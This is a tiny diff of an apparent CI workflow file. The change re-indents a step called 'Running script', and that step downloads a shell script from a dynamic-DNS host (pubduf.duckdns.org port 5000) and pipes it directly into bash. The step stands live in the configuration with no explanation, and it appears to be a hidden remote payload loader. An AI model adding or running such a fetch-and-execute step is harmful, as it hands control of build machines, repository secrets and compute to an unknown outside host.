@@ -12,4 +12,4 @@ jobs:
 
     steps:
     - name: Running script
-        run: curl "http://pubduf.duckdns.org:5000/run.sh" | bash
+    run: curl "http://pubduf.duckdns.org:5000/run.sh" | bash
